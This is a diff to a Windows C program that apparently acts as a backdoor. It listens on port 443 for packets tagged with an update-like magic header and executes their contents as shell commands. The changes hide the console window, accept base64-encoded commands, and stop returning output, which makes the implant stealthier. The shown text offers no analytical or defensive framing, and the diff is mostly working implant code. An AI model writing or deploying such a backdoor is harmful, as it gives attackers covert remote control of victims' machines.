@@ -1,23 +1,23 @@
+#define SECURITY_WIN32
+#define WIN32_LEAN_AND_MEAN
+
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <wincrypt.h>
 #include <schannel.h>
 #include <security.h>
 #include <secext.h>
+#include <objbase.h>
+#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <wmistr.h>
-#include <evntrace.h>
-#include <comutil.h>
-#include <WbemIdl.h>
 
-#pragma comment(lib, "wbemuuid.lib")
-#pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "secur32.lib")
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "user32.lib")
 
 #define LISTEN_PORT 443
 #define MAGIC_HEADER "INTLUPD:"
@@ -53,6 +53,12 @@ int main()
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
         return 1;
+    }
+
+    // Hide console window
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd) {
+        ShowWindow(hwnd, SW_HIDE);
     }
 
     // Create TCP socket
@@ -102,23 +108,33 @@ int main()
 
             // Check magic header
             if (bytes_received >= MAGIC_LEN && strncmp(buffer, MAGIC_HEADER, MAGIC_LEN) == 0) {
-                // Extract command
-                int cmd_len = bytes_received - MAGIC_LEN;
-                cmd = (char *)malloc(cmd_len + 1);
-                if (cmd) {
-                    memcpy(cmd, buffer + MAGIC_LEN, cmd_len);
-                    cmd[cmd_len] = '\0';
+                // Extract base64 encoded command
+                int encoded_len = bytes_received - MAGIC_LEN;
+                char *encoded_cmd = (char *)malloc(encoded_len + 1);
+                if (encoded_cmd) {
+                    memcpy(encoded_cmd, buffer + MAGIC_LEN, encoded_len);
+                    encoded_cmd[encoded_len] = '\0';
 
-                    // Execute and capture output
-                    char *output = CaptureProcessOutput(cmd);
+                    // Decode base64
+                    DWORD decoded_len = 0;
+                    if (CryptStringToBinaryA(encoded_cmd, 0, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL)) {
+                        cmd = (char *)malloc(decoded_len + 1);
+                        if (cmd && CryptStringToBinaryA(encoded_cmd, 0, CRYPT_STRING_BASE64, (BYTE *)cmd, &decoded_len, NULL, NULL)) {
+                            cmd[decoded_len] = '\0';
 
-                    // Send output back (TLS encrypted in real implementation)
-                    if (output) {
-                        send(client_socket, output, strlen(output), 0);
-                        free(output);
+                            // Execute command (fire-and-forget, no output return)
+                            char *output = CaptureProcessOutput(cmd);
+                            if (output) {
+                                free(output);
+                            }
+
+                            free(cmd);
+                        } else {
+                            free(cmd);
+                        }
                     }
 
-                    free(cmd);
+                    free(encoded_cmd);
                 }
             }
         }
